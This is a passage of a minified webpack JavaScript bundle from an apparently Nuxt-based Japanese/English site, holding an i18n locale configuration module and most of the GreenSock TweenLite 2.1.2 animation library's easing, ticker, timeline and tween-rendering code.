/*! For license information please see LICENSES */
(window.webpackJsonp=window.webpackJsonp||[]).push([[0],[function(t,e,i){"use strict";i.d(e,"v",(function(){return n})),i.d(e,"q",(function(){return r})),i.d(e,"j",(function(){return a})),i.d(e,"t",(function(){return o})),i.d(e,"k",(function(){return s})),i.d(e,"u",(function(){return l})),i.d(e,"o",(function(){return c})),i.d(e,"s",(function(){return h})),i.d(e,"l",(function(){return u})),i.d(e,"m",(function(){return d})),i.d(e,"n",(function(){return p})),i.d(e,"h",(function(){return f})),i.d(e,"w",(function(){return m})),i.d(e,"i",(function(){return _})),i.d(e,"r",(function(){return g})),i.d(e,"f",(function(){return v})),i.d(e,"b",(function(){return y})),i.d(e,"e",(function(){return x})),i.d(e,"c",(function(){return b})),i.d(e,"d",(function(){return w})),i.d(e,"g",(function(){return T})),i.d(e,"a",(function(){return S})),i.d(e,"p",(function(){return M}));var n={fallbackLocale:"ja"},r=[{code:"ja",iso:"ja"},{code:"en",iso:"en"}],a="ja",o="___",s="default",l="prefix_except_default",c=!1,h=null,u={useCookie:!0,cookieKey:"i18n_locale",alwaysRedirect:!1,fallbackLocale:null},d=!1,p=!1,f="",m={moduleName:"i18n",syncLocale:!1,syncMessages:!1,syncRouteParams:!0},_=function(){return null},g=function(){return null},v="nuxt-i18n",y="code",x="iso",b="domain",w="file",T={PREFIX:"prefix",PREFIX_EXCEPT_DEFAULT:"prefix_except_default",PREFIX_AND_DEFAULT:"prefix_and_default",NO_PREFIX:"no_prefix"},S="nuxtI18n",M=["ja","en"]},function(t,e,i){"use strict";i.r(e),function(t,n){i.d(e,"_gsScope",(function(){return a})),i.d(e,"TweenLite",(function(){return o})),i.d(e,"globals",(function(){return s})),i.d(e,"default",(function(){return o})),i.d(e,"SimpleTimeline",(function(){return c})),i.d(e,"Animation",(function(){return h})),i.d(e,"Ease",(function(){return u})),i.d(e,"Linear",(function(){return d})),i.d(e,"Power0",(function(){return p})),i.d(e,"Power1",(function(){return f})),i.d(e,"Power2",(function(){return m})),i.d(e,"Power3",(function(){return _})),i.d(e,"Power4",(function(){return g})),i.d(e,"TweenPlugin",(function(){return v})),i.d(e,"EventDispatcher",(function(){return y})),i(22),i(29),i(25);var r=i(7),a=(i(41),i(42),i(5),i(33),"undefined"!=typeof window?window:t.exports&&void 0!==n?n:{}),o=function(t){var e={},i=t.document,n=t.GreenSockGlobals=t.GreenSockGlobals||t;if(n.TweenLite)return n.TweenLite;var a,o,s,l,c,h,u,d=function(t){var e,i=t.split("."),r=n;for(e=0;e<i.length;e++)r[i[e]]=r=r[i[e]]||{};return r},p=d("com.greensock"),f=function(t){var e,i=[],n=t.length;for(e=0;e!==n;i.push(t[e++]));return i},m=function(){},_=(h=Object.prototype.toString,u=h.call([]),function(t){return null!=t&&(t instanceof Array||"object"===Object(r.a)(t)&&!!t.push&&h.call(t)===u)}),g={},v=function t(i,r,a,o){this.sc=g[i]?g[i].sc:[],g[i]=this,this.gsClass=null,this.func=a;var s=[];this.check=function(l){for(var c,h,u,p,f=r.length,m=f;--f>-1;)(c=g[r[f]]||new t(r[f],[])).gsClass?(s[f]=c.gsClass,m--):l&&c.sc.push(this);if(0===m&&a)for(u=(h=("com.greensock."+i).split(".")).pop(),p=d(h.join("."))[u]=this.gsClass=a.apply(a,s),o&&(n[u]=e[u]=p),f=0;f<this.sc.length;f++)this.sc[f].check()},this.check(!0)},y=t._gsDefine=function(t,e,i,n){return new v(t,e,i,n)},x=p._class=function(t,e,i){return e=e||function(){},y(t,[],(function(){return e}),i),e};y.globals=n;var b=[0,0,1,1],w=x("easing.Ease",(function(t,e,i,n){this._func=t,this._type=i||0,this._power=n||0,this._params=e?b.concat(e):b}),!0),T=w.map={},S=w.register=function(t,e,i,n){for(var r,a,o,s,l=e.split(","),c=l.length,h=(i||"easeIn,easeOut,easeInOut").split(",");--c>-1;)for(a=l[c],r=n?x("easing."+a,null,!0):p.easing[a]||{},o=h.length;--o>-1;)s=h[o],T[a+"."+s]=T[s+a]=r[s]=t.getRatio?t:t[s]||new t};for((s=w.prototype)._calcEnd=!1,s.getRatio=function(t){if(this._func)return this._params[0]=t,this._func.apply(null,this._params);var e=this._type,i=this._power,n=1===e?1-t:2===e?t:t<.5?2*t:2*(1-t);return 1===i?n*=n:2===i?n*=n*n:3===i?n*=n*n*n:4===i&&(n*=n*n*n*n),1===e?1-n:2===e?n:t<.5?n/2:1-n/2},o=(a=["Linear","Quad","Cubic","Quart","Quint,Strong"]).length;--o>-1;)s=a[o]+",Power"+o,S(new w(null,null,1,o),s,"easeOut",!0),S(new w(null,null,2,o),s,"easeIn"+(0===o?",easeNone":"")),S(new w(null,null,3,o),s,"easeInOut");T.linear=p.easing.Linear.easeIn,T.swing=p.easing.Quad.easeInOut;var M=x("events.EventDispatcher",(function(t){this._listeners={},this._eventTarget=t||this}));(s=M.prototype).addEventListener=function(t,e,i,n,r){r=r||0;var a,o,s=this._listeners[t],h=0;for(this!==l||c||l.wake(),null==s&&(this._listeners[t]=s=[]),o=s.length;--o>-1;)(a=s[o]).c===e&&a.s===i?s.splice(o,1):0===h&&a.pr<r&&(h=o+1);s.splice(h,0,{c:e,s:i,up:n,pr:r})},s.removeEventListener=function(t,e){var i,n=this._listeners[t];if(n)for(i=n.length;--i>-1;)if(n[i].c===e)return void n.splice(i,1)},s.dispatchEvent=function(t){var e,i,n,r=this._listeners[t];if(r)for((e=r.length)>1&&(r=r.slice(0)),i=this._eventTarget;--e>-1;)(n=r[e])&&(n.up?n.c.call(n.s||i,{type:t,target:i}):n.c.call(n.s||i))};var E=t.requestAnimationFrame,L=t.cancelAnimationFrame,k=Date.now||function(){return(new Date).getTime()},A=k();for(o=(a=["ms","moz","webkit","o"]).length;--o>-1&&!E;)E=t[a[o]+"RequestAnimationFrame"],L=t[a[o]+"CancelAnimationFrame"]||t[a[o]+"CancelRequestAnimationFrame"];x("Ticker",(function(t,e){var n,r,a,o,s,h=this,u=k(),d=!(!1===e||!E)&&"auto",p=500,f=33,_=function t(e){var i,l,c=k()-A;c>p&&(u+=c-f),A+=c,h.time=(A-u)/1e3,i=h.time-s,(!n||i>0||!0===e)&&(h.frame++,s+=i+(i>=o?.004:o-i),l=!0),!0!==e&&(a=r(t)),l&&h.dispatchEvent("tick")};M.call(h),h.time=h.frame=0,h.tick=function(){_(!0)},h.lagSmoothing=function(t,e){if(!arguments.length)return p<1e8;p=t||1e8,f=Math.min(e,p,0)},h.sleep=function(){null!=a&&(d&&L?L(a):clearTimeout(a),r=m,a=null,h===l&&(c=!1))},h.wake=function(t){null!==a?h.sleep():t?u+=-A+(A=k()):h.frame>10&&(A=k()-p+5),r=0===n?m:d&&E?E:function(t){return setTimeout(t,1e3*(s-h.time)+1|0)},h===l&&(c=!0),_(2)},h.fps=function(t){if(!arguments.length)return n;o=1/((n=t)||60),s=this.time+o,h.wake()},h.useRAF=function(t){if(!arguments.length)return d;h.sleep(),d=t,h.fps(n)},h.fps(t),setTimeout((function(){"auto"===d&&h.frame<5&&"hidden"!==(i||{}).visibilityState&&h.useRAF(!1)}),1500)})),(s=p.Ticker.prototype=new p.events.EventDispatcher).constructor=p.Ticker;var P=x("core.Animation",(function(t,e){if(this.vars=e=e||{},this._duration=this._totalDuration=t||0,this._delay=Number(e.delay)||0,this._timeScale=1,this._active=!!e.immediateRender,this.data=e.data,this._reversed=!!e.reversed,q){c||l.wake();var i=this.vars.useFrames?$:q;i.add(this,i._time),this.vars.paused&&this.paused(!0)}}));l=P.ticker=new p.Ticker,(s=P.prototype)._dirty=s._gc=s._initted=s._paused=!1,s._totalTime=s._time=0,s._rawPrevTime=-1,s._next=s._last=s._onUpdate=s._timeline=s.timeline=null,s._paused=!1,function t(){c&&k()-A>2e3&&("hidden"!==(i||{}).visibilityState||!l.lagSmoothing())&&l.wake();var e=setTimeout(t,2e3);e.unref&&e.unref()}(),s.play=function(t,e){return null!=t&&this.seek(t,e),this.reversed(!1).paused(!1)},s.pause=function(t,e){return null!=t&&this.seek(t,e),this.paused(!0)},s.resume=function(t,e){return null!=t&&this.seek(t,e),this.paused(!1)},s.seek=function(t,e){return this.totalTime(Number(t),!1!==e)},s.restart=function(t,e){return this.reversed(!1).paused(!1).totalTime(t?-this._delay:0,!1!==e,!0)},s.reverse=function(t,e){return null!=t&&this.seek(t||this.totalDuration(),e),this.reversed(!0).paused(!1)},s.render=function(t,e,i){},s.invalidate=function(){return this._time=this._totalTime=0,this._initted=this._gc=!1,this._rawPrevTime=-1,!this._gc&&this.timeline||this._enabled(!0),this},s.isActive=function(){var t,e=this._timeline,i=this._startTime;return!e||!this._gc&&!this._paused&&e.isActive()&&(t=e.rawTime(!0))>=i&&t<i+this.totalDuration()/this._timeScale-1e-8},s._enabled=function(t,e){return c||l.wake(),this._gc=!t,this._active=this.isActive(),!0!==e&&(t&&!this.timeline?this._timeline.add(this,this._startTime-this._delay):!t&&this.timeline&&this._timeline._remove(this,!0)),!1},s._kill=function(t,e){return this._enabled(!1,!1)},s.kill=function(t,e){return this._kill(t,e),this},s._uncache=function(t){for(var e=t?this:this.timeline;e;)e._dirty=!0,e=e.timeline;return this},s._swapSelfInParams=function(t){for(var e=t.length,i=t.concat();--e>-1;)"{self}"===t[e]&&(i[e]=this);return i},s._callback=function(t){var e=this.vars,i=e[t],n=e[t+"Params"],r=e[t+"Scope"]||e.callbackScope||this;switch(n?n.length:0){case 0:i.call(r);break;case 1:i.call(r,n[0]);break;case 2:i.call(r,n[0],n[1]);break;default:i.apply(r,n)}},s.eventCallback=function(t,e,i,n){if("on"===(t||"").substr(0,2)){var r=this.vars;if(1===arguments.length)return r[t];null==e?delete r[t]:(r[t]=e,r[t+"Params"]=_(i)&&-1!==i.join("").indexOf("{self}")?this._swapSelfInParams(i):i,r[t+"Scope"]=n),"onUpdate"===t&&(this._onUpdate=e)}return this},s.delay=function(t){return arguments.length?(this._timeline.smoothChildTiming&&this.startTime(this._startTime+t-this._delay),this._delay=t,this):this._delay},s.duration=function(t){return arguments.length?(this._duration=this._totalDuration=t,this._uncache(!0),this._timeline.smoothChildTiming&&this._time>0&&this._time<this._duration&&0!==t&&this.totalTime(this._totalTime*(t/this._duration),!0),this):(this._dirty=!1,this._duration)},s.totalDuration=function(t){return this._dirty=!1,arguments.length?this.duration(t):this._totalDuration},s.time=function(t,e){return arguments.length?(this._dirty&&this.totalDuration(),this.totalTime(t>this._duration?this._duration:t,e)):this._time},s.totalTime=function(t,e,i){if(c||l.wake(),!arguments.length)return this._totalTime;if(this._timeline){if(t<0&&!i&&(t+=this.totalDuration()),this._timeline.smoothChildTiming){this._dirty&&this.totalDuration();var n=this._totalDuration,r=this._timeline;if(t>n&&!i&&(t=n),this._startTime=(this._paused?this._pauseTime:r._time)-(this._reversed?n-t:t)/this._timeScale,r._dirty||this._uncache(!1),r._timeline)for(;r._timeline;)r._timeline._time!==(r._startTime+r._totalTime)/r._timeScale&&r.totalTime(r._totalTime,!0),r=r._timeline}this._gc&&this._enabled(!0,!1),this._totalTime===t&&0!==this._duration||(I.length&&K(),this.render(t,e,!1),I.length&&K())}return this},s.progress=s.totalProgress=function(t,e){var i=this.duration();return arguments.length?this.totalTime(i*t,e):i?this._time/i:this.ratio},s.startTime=function(t){return arguments.length?(t!==this._startTime&&(this._startTime=t,this.timeline&&this.timeline._sortChildren&&this.timeline.add(this,t-this._delay)),this):this._startTime},s.endTime=function(t){return this._startTime+(0!=t?this.totalDuration():this.duration())/this._timeScale},s.timeScale=function(t){if(!arguments.length)return this._timeScale;var e,i;for(t=t||1e-8,this._timeline&&this._timeline.smoothChildTiming&&(i=(e=this._pauseTime)||0===e?e:this._timeline.totalTime(),this._startTime=i-(i-this._startTime)*this._timeScale/t),this._timeScale=t,i=this.timeline;i&&i.timeline;)i._dirty=!0,i.totalDuration(),i=i.timeline;return this},s.reversed=function(t){return arguments.length?(t!=this._reversed&&(this._reversed=t,this.totalTime(this._timeline&&!this._timeline.smoothChildTiming?this.totalDuration()-this._totalTime:this._totalTime,!0)),this):this._reversed},s.paused=function(t){if(!arguments.length)return this._paused;var e,i,n=this._timeline;return t!=this._paused&&n&&(c||t||l.wake(),i=(e=n.rawTime())-this._pauseTime,!t&&n.smoothChildTiming&&(this._startTime+=i,this._uncache(!1)),this._pauseTime=t?e:null,this._paused=t,this._active=this.isActive(),!t&&0!==i&&this._initted&&this.duration()&&(e=n.smoothChildTiming?this._totalTime:(e-this._startTime)/this._timeScale,this.render(e,e===this._totalTime,!0))),this._gc&&!t&&this._enabled(!0,!1),this};var O=x("core.SimpleTimeline",(function(t){P.call(this,0,t),this.autoRemoveChildren=this.smoothChildTiming=!0}));(s=O.prototype=new P).constructor=O,s.kill()._gc=!1,s._first=s._last=s._recent=null,s._sortChildren=!1,s.add=s.insert=function(t,e,i,n){var r,a;if(t._startTime=Number(e||0)+t._delay,t._paused&&this!==t._timeline&&(t._pauseTime=this.rawTime()-(t._timeline.rawTime()-t._pauseTime)),t.timeline&&t.timeline._remove(t,!0),t.timeline=t._timeline=this,t._gc&&t._enabled(!0,!0),r=this._last,this._sortChildren)for(a=t._startTime;r&&r._startTime>a;)r=r._prev;return r?(t._next=r._next,r._next=t):(t._next=this._first,this._first=t),t._next?t._next._prev=t:this._last=t,t._prev=r,this._recent=t,this._timeline&&this._uncache(!0),this},s._remove=function(t,e){return t.timeline===this&&(e||t._enabled(!1,!0),t._prev?t._prev._next=t._next:this._first===t&&(this._first=t._next),t._next?t._next._prev=t._prev:this._last===t&&(this._last=t._prev),t._next=t._prev=t.timeline=null,t===this._recent&&(this._recent=this._last),this._timeline&&this._uncache(!0)),this},s.render=function(t,e,i){var n,r=this._first;for(this._totalTime=this._time=this._rawPrevTime=t;r;)n=r._next,(r._active||t>=r._startTime&&!r._paused&&!r._gc)&&(r._reversed?r.render((r._dirty?r.totalDuration():r._totalDuration)-(t-r._startTime)*r._timeScale,e,i):r.render((t-r._startTime)*r._timeScale,e,i)),r=n},s.rawTime=function(){return c||l.wake(),this._totalTime};var C=x("TweenLite",(function(e,i,n){if(P.call(this,i,n),this.render=C.prototype.render,null==e)throw"Cannot tween a null target.";this.target=e="string"!=typeof e?e:C.selector(e)||e;var r,a,o,s=e.jquery||e.length&&e!==t&&e[0]&&(e[0]===t||e[0].nodeType&&e[0].style&&!e.nodeType),l=this.vars.overwrite;if(this._overwrite=l=null==l?X[C.defaultOverwrite]:"number"==typeof l?l>>0:X[l],(s||e instanceof Array||e.push&&_(e))&&"number"!=typeof e[0])for(this._targets=o=f(e),this._propLookup=[],this._siblings=[],r=0;r<o.length;r++)(a=o[r])?"string"!=typeof a?a.length&&a!==t&&a[0]&&(a[0]===t||a[0].nodeType&&a[0].style&&!a.nodeType)?(o.splice(r--,1),this._targets=o=o.concat(f(a))):(this._siblings[r]=J(a,this,!1),1===l&&this._siblings[r].length>1&&tt(a,this,null,1,this._siblings[r])):"string"==typeof(a=o[r--]=C.selector(a))&&o.splice(r+1,1):o.splice(r--,1);else this._propLookup={},this._siblings=J(e,this,!1),1===l&&this._siblings.length>1&&tt(e,this,null,1,this._siblings);(this.vars.immediateRender||0===i&&0===this._delay&&!1!==this.vars.immediateRender)&&(this._time=-1e-8,this.render(Math.min(0,-this._delay)))}),!0),R=function(e){return e&&e.length&&e!==t&&e[0]&&(e[0]===t||e[0].nodeType&&e[0].style&&!e.nodeType)};(s=C.prototype=new P).constructor=C,s.kill()._gc=!1,s.ratio=0,s._firstPT=s._targets=s._overwrittenProps=s._startAt=null,s._notifyPluginsOfEnabled=s._lazy=!1,C.version="2.1.2",C.defaultEase=s._ease=new w(null,null,1,1),C.defaultOverwrite="auto",C.ticker=l,C.autoSleep=120,C.lagSmoothing=function(t,e){l.lagSmoothing(t,e)},C.selector=t.$||t.jQuery||function(e){var n=t.$||t.jQuery;return n?(C.selector=n,n(e)):(i||(i=t.document),i?i.querySelectorAll?i.querySelectorAll(e):i.getElementById("#"===e.charAt(0)?e.substr(1):e):e)};var I=[],F={},N=/(?:(-|-=|\+=)?\d*\.?\d*(?:e[\-+]?\d+)?)[0-9]/gi,z=/[\+-]=-?[\.\d]/,D=function(t){for(var e,i=this._firstPT;i;)e=i.blob?1===t&&null!=this.end?this.end:t?this.join(""):this.start:i.c*t+i.s,i.m?e=i.m.call(this._tween,e,this._target||i.t,this._tween):e<1e-6&&e>-1e-6&&!i.blob&&(e=0),i.f?i.fp?i.t[i.p](i.fp,e):i.t[i.p](e):i.t[i.p]=e,i=i._next},G=function(t){return(1e3*t|0)/1e3+""},U=function(t,e,i,n){var r,a,o,s,l,c,h,u=[],d=0,p="",f=0;for(u.start=t,u.end=e,t=u[0]=t+"",e=u[1]=e+"",i&&(i(u),t=u[0],e=u[1]),u.length=0,r=t.match(N)||[],a=e.match(N)||[],n&&(n._next=null,n.blob=1,u._firstPT=u._applyPT=n),l=a.length,s=0;s<l;s++)h=a[s],p+=(c=e.substr(d,e.indexOf(h,d)-d))||!s?c:",",d+=c.length,f?f=(f+1)%5:"rgba("===c.substr(-5)&&(f=1),h===r[s]||r.length<=s?p+=h:(p&&(u.push(p),p=""),o=parseFloat(r[s]),u.push(o),u._firstPT={_next:u._firstPT,t:u,p:u.length-1,s:o,c:("="===h.charAt(1)?parseInt(h.charAt(0)+"1",10)*parseFloat(h.substr(2)):parseFloat(h)-o)||0,f:0,m:f&&f<4?Math.round:G}),d+=h.length;return(p+=e.substr(d))&&u.push(p),u.setRatio=D,z.test(e)&&(u.end=null),u},B=function(t,e,i,n,a,o,s,l,c){"function"==typeof n&&(n=n(c||0,t));var h=Object(r.a)(t[e]),u="function"!==h?"":e.indexOf("set")||"function"!=typeof t["get"+e.substr(3)]?e:"get"+e.substr(3),d="get"!==i?i:u?s?t[u](s):t[u]():t[e],p="string"==typeof n&&"="===n.charAt(1),f={t:t,p:e,s:d,f:"function"===h,pg:0,n:a||e,m:o?"function"==typeof o?o:Math.round:0,pr:0,c:p?parseInt(n.charAt(0)+"1",10)*parseFloat(n.substr(2)):parseFloat(n)-d||0};if(("number"!=typeof d||"number"!=typeof n&&!p)&&(s||isNaN(d)||!p&&isNaN(n)||"boolean"==typeof d||"boolean"==typeof n?(f.fp=s,f={t:U(d,p?parseFloat(f.s)+f.c+(f.s+"").replace(/[0-9\-\.]/g,""):n,l||C.defaultStringFilter,f),p:"setRatio",s:0,c:1,f:2,pg:0,n:a||e,pr:0,m:0}):(f.s=parseFloat(d),p||(f.c=parseFloat(n)-f.s||0))),f.c)return(f._next=this._firstPT)&&(f._next._prev=f),this._firstPT=f,f},j=C._internals={isArray:_,isSelector:R,lazyTweens:I,blobDif:U},W=C._plugins={},H=j.tweenLookup={},V=0,Y=j.reservedProps={ease:1,delay:1,overwrite:1,onComplete:1,onCompleteParams:1,onCompleteScope:1,useFrames:1,runBackwards:1,startAt:1,onUpdate:1,onUpdateParams:1,onUpdateScope:1,onStart:1,onStartParams:1,onStartScope:1,onReverseComplete:1,onReverseCompleteParams:1,onReverseCompleteScope:1,onRepeat:1,onRepeatParams:1,onRepeatScope:1,easeParams:1,yoyo:1,immediateRender:1,repeat:1,repeatDelay:1,data:1,paused:1,reversed:1,autoCSS:1,lazy:1,onOverwrite:1,callbackScope:1,stringFilter:1,id:1,yoyoEase:1,stagger:1},X={none:0,all:1,auto:2,concurrent:3,allOnStart:4,preexisting:5,true:1,false:0},$=P._rootFramesTimeline=new O,q=P._rootTimeline=new O,Z=30,K=j.lazyRender=function(){var t,e,i=I.length;for(F={},t=0;t<i;t++)(e=I[t])&&!1!==e._lazy&&(e.render(e._lazy[0],e._lazy[1],!0),e._lazy=!1);I.length=0};q._startTime=l.time,$._startTime=l.frame,q._active=$._active=!0,setTimeout(K,1),P._updateRoot=C.render=function(){var t,e,i;if(I.length&&K(),q.render((l.time-q._startTime)*q._timeScale,!1,!1),$.render((l.frame-$._startTime)*$._timeScale,!1,!1),I.length&&K(),l.frame>=Z){for(i in Z=l.frame+(parseInt(C.autoSleep,10)||120),H){for(t=(e=H[i].tweens).length;--t>-1;)e[t]._gc&&e.splice(t,1);0===e.length&&delete H[i]}if((!(i=q._first)||i._paused)&&C.autoSleep&&!$._first&&1===l._listeners.tick.length){for(;i&&i._paused;)i=i._next;i||l.sleep()}}},l.addEventListener("tick",P._updateRoot);var J=function(t,e,i){var n,r,a=t._gsTweenID;if(H[a||(t._gsTweenID=a="t"+V++)]||(H[a]={target:t,tweens:[]}),e&&((n=H[a].tweens)[r=n.length]=e,i))for(;--r>-1;)n[r]===e&&n.splice(r,1);return H[a].tweens},Q=function(t,e,i,n){var r,a,o=t.vars.onOverwrite;return o&&(r=o(t,e,i,n)),(o=C.onOverwrite)&&(a=o(t,e,i,n)),!1!==r&&!1!==a},tt=function(t,e,i,n,r){var a,o,s,l;if(1===n||n>=4){for(l=r.length,a=0;a<l;a++)if((s=r[a])!==e)s._gc||s._kill(null,t,e)&&(o=!0);else if(5===n)break;return o}var c,h=e._startTime+1e-8,u=[],d=0,p=0===e._duration;for(a=r.length;--a>-1;)(s=r[a])===e||s._gc||s._paused||(s._timeline!==e._timeline?(c=c||et(e,0,p),0===et(s,c,p)&&(u[d++]=s)):s._startTime<=h&&s._startTime+s.totalDuration()/s._timeScale>h&&((p||!s._initted)&&h-s._startTime<=2e-8||(u[d++]=s)));for(a=d;--a>-1;)if(l=(s=u[a])._firstPT,2===n&&s._kill(i,t,e)&&(o=!0),2!==n||!s._firstPT&&s._initted&&l){if(2!==n&&!Q(s,e))continue;s._enabled(!1,!1)&&(o=!0)}return o},et=function(t,e,i){for(var n=t._timeline,r=n._timeScale,a=t._startTime;n._timeline;){if(a+=n._startTime,r*=n._timeScale,n._paused)return-100;n=n._timeline}return(a/=r)>e?a-e:i&&a===e||!t._initted&&a-e<2e-8?1e-8:(a+=t.totalDuration()/t._timeScale/r)>e+1e-8?0:a-e-1e-8};s._init=function(){var t,e,i,n,r,a,o=this.vars,s=this._overwrittenProps,l=this._duration,c=!!o.immediateRender,h=o.ease,u=this._startAt;if(o.startAt){for(n in u&&(u.render(-1,!0),u.kill()),r={},o.startAt)r[n]=o.startAt[n];if(r.data="isStart",r.overwrite=!1,r.immediateRender=!0,r.lazy=c&&!1!==o.lazy,r.startAt=r.delay=null,r.onUpdate=o.onUpdate,r.onUpdateParams=o.onUpdateParams,r.onUpdateScope=o.onUpdateScope||o.callbackScope||this,this._startAt=C.to(this.target||{},0,r),c)if(this._time>0)this._startAt=null;else if(0!==l)return}else if(o.runBackwards&&0!==l)if(u)u.render(-1,!0),u.kill(),this._startAt=null;else{for(n in 0!==this._time&&(c=!1),i={},o)Y[n]&&"autoCSS"!==n||(i[n]=o[n]);if(i.overwrite=0,i.data="isFromStart",i.lazy=c&&!1!==o.lazy,i.immediateRender=c,this._startAt=C.to(this.target,0,i),c){if(0===this._time)return}else this._startAt._init(),this._startAt._enabled(!1),this.vars.immediateRender&&(this._startAt=null)}if(this._ease=h=h?h instanceof w?h:"function"==typeof h?new w(h,o.easeParams):T[h]||C.defaultEase:C.defaultEase,o.easeParams instanceof Array&&h.config&&(this._ease=h.config.apply(h,o.easeParams)),this._easeType=this._ease._type,this._easePower=this._ease._power,this._firstPT=null,this._targets)for(a=this._targets.length,t=0;t<a;t++)this._initProps(this._targets[t],this._propLookup[t]={},this._siblings[t],s?s[t]:null,t)&&(e=!0);else e=this._initProps(this.target,this._propLookup,this._siblings,s,0);if(e&&C._onPluginEvent("_onInitAllProps",this),s&&(this._firstPT||"function"!=typeof this.target&&this._enabled(!1,!1)),o.runBackwards)for(i=this._firstPT;i;)i.s+=i.c,i.c=-i.c,i=i._next;this._onUpdate=o.onUpdate,this._initted=!0},s._initProps=function(e,i,n,r,a){var o,s,l,c,h,u;if(null==e)return!1;for(o in F[e._gsTweenID]&&K(),this.vars.css||e.style&&e!==t&&e.nodeType&&W.css&&!1!==this.vars.autoCSS&&function(t,e){var i,n={};for(i in t)Y[i]||i in e&&"transform"!==i&&"x"!==i&&"y"!==i&&"width"!==i&&"height"!==i&&"className"!==i&&"border"!==i||!(!W[i]||W[i]&&W[i]._autoCSS)||(n[i]=t[i],delete t[i]);t.css=n}(this.vars,e),this.vars)if(u=this.vars[o],Y[o])u&&(u instanceof Array||u.push&&_(u))&&-1!==u.join("").indexOf("{self}")&&(this.vars[o]=u=this._swapSelfInParams(u,this));else if(W[o]&&(c=new W[o])._onInitTween(e,this.vars[o],this,a)){for(this._firstPT=h={_next:this._firstPT,t:c,p:"setRatio",s:0,c:1,f:1,n:o,pg:1,pr:c._priority,m:0},s=c._overwriteProps.length;--s>-1;)i[c._overwriteProps[s]]=this._firstPT;(c._priority||c._onInitAllProps)&&(l=!0),(c._onDisable||c._onEnable)&&(this._notifyPluginsOfEnabled=!0),h._next&&(h._next._prev=h)}else i[o]=B.call(this,e,o,"get",u,o,0,null,this.vars.stringFilter,a);return r&&this._kill(r,e)?this._initProps(e,i,n,r,a):this._overwrite>1&&this._firstPT&&n.length>1&&tt(e,this,i,this._overwrite,n)?(this._kill(i,e),this._initProps(e,i,n,r,a)):(this._firstPT&&(!1!==this.vars.lazy&&this._duration||this.vars.lazy&&!this._duration)&&(F[e._gsTweenID]=!0),l)},s.render=function(t,e,i){var n,r,a,o,s=this._time,l=this._duration,c=this._rawPrevTime;if(t>=l-1e-8&&t>=0)this._totalTime=this._time=l,this.ratio=this._ease._calcEnd?this._ease.getRatio(1):1,this._reversed||(n=!0,r="onComplete",i=i||this._timeline.autoRemoveChildren),0===l&&(this._initted||!this.vars.lazy||i)&&(this._startTime===this._timeline._duration&&(t=0),(c<0||t<=0&&t>=-1e-8||1e-8===c&&"isPause"!==this.data)&&c!==t&&(i=!0,c>1e-8&&(r="onReverseComplete")),this._rawPrevTime=o=!e||t||c===t?t:1e-8);else if(t<1e-8)this._totalTime=this._time=0,this.ratio=this._ease._calcEnd?this._ease.getRatio(0):0,(0!==s||0===l&&c>0)&&(r="onReverseComplete",n=this._reversed),t>-1e-8?t=0:t<0&&(this._active=!1,0===l&&(this._initted||!this.vars.lazy||i)&&(c>=0&&(1e-8!==c||"isPause"!==this.data)&&(i=!0),this._rawPrevTime=o=!e||t||c===t?t:1e-8)),(!this._initted||this._startAt&&this._startAt.progress())&&(i=!0);else if(this._totalTime=this._time=t,this._easeType){var h=t/l,u=this._easeType,d=this._easePower;(1===u||3===u&&h>=.5)&&(h=1-h),3===u&&(h*=2),1===d?h*=h:2===d?h*=h*h:3===d?h*=h*h*h:4===d&&(h*=h*h*h*h),this.ratio=1===u?1-h:2===u?h:t/l<.5?h/2:1-h/2}else this.ratio=this._ease.getRatio(t/l);if(this._time!==s||i){if(!this._initted){if(this._init(),!this._initted||this._gc)return;if(!i&&this._firstPT&&(!1!==this.vars.lazy&&this._duration||this.vars.lazy&&!this._duration))return this._time=this._totalTime=s,this._rawPrevTime=c,I.push(this),void(this._lazy=[t,e]);this._time&&!n?this.ratio=this._ease.getRatio(this._time/l):n&&this._ease._calcEnd&&(this.ratio=this._ease.getRatio(0===this._time?0:1))}for(!1!==this._lazy&&(this._lazy=!1),this._active||!this._paused&&this._time!==s&&t>=0&&(this._active=!0),0===s&&(this._startAt&&(t>=0?this._startAt.render(t,!0,i):r||(r="_dummyGS")),this.vars.onStart&&(0===this._time&&0!==l||e||this._callback("onStart"))),a=this._firstPT;a;)a.f?a.t[a.p](a.c*this.ratio+a.s):a.t[a.p]=a.c*this.ratio+a.s,a=a._next;this._onUpdate&&(t<0&&this._startAt&&-1e-4!==t&&this._startAt.render(t,!0,i),e||(this._time!==s||n||i)&&this._callback("onUpdate")),r&&(this._gc&&!i||(t<0&&this._startAt&&!this._onUpdate&&-1e-4!==t&&this._startAt.render(t,!0,i),n&&(this._timeline.autoRemoveChildren&&this._enabled(!1,!1),this._active=!1),!e&&this.vars[r]&&this._callback(r),0===l&&1e-8===this._rawPrevTime&&1e-8!==o&&(this._rawPrevTime=0)))}},s._kill=function(t,e,i){if("all"===t&&(t=null),null==t&&(null==e||e===this.target))return this._lazy=!1,this._enabled(!1,!1);e="string"!=typeof e?e||this._targets||this.target:C.selector(e)||e;var n,a,o,s,l,c,h,u,d,p=i&&this._time&&i._startTime===this._startTime&&this._timeline===i._timeline,f=this._firstPT;if((_(e)||R(e))&&"number"!=typeof e[0])for(n=e.length;--n>-1;)this._kill(t,e[n],i)&&(c=!0);else{if(this._targets){for(n=this._targets.length;--n>-1;)if(e===this._targets[n]){l=this._propLookup[n]||{},this._overwrittenProps=this._overwrittenProps||[],a=this._overwrittenProps[n]=t?this._overwrittenProps[n]||{}:"all";break}}else{if(e!==this.target)return!1;l=this._propLookup,a=this._overwrittenProps=t?this._overwrittenProps||{}:"all"}if(l){if(h=t||l,u=t!==a&&"all"!==a&&t!==l&&("object"!==Object(r.a)(t)||!t._tempKill),i&&(C.onOverwrite||this.vars.onOverwrite)){for(o in h)l[o]&&(d||(d=[]),d.push(o));if((d||!t)&&!Q(this,i,e,d))return!1}for(o in h)(s=l[o])&&(p&&(s.f?s.t[s.p](s.s):s.t[s.p]=s.s,c=!0),s.pg&&s.t._kill(h)&&(c=!0),s.pg&&0!==s.t._overwriteProps.length||(s._prev?s._prev._next=s._next:s===this._firstPT&&(this._firstPT=s._next),s._next&&(s._next._prev=s._prev),s._next=s._prev=null),delete l[o]),u&&(a[o]=1);!this._firstPT&&this._initted&&f&&this._enabled(!1,!1)}}return c},s.invalidate=function(){this._notifyPluginsOfEnabled&&C._onPluginEvent("_onDisable",this);var t=this._time;return 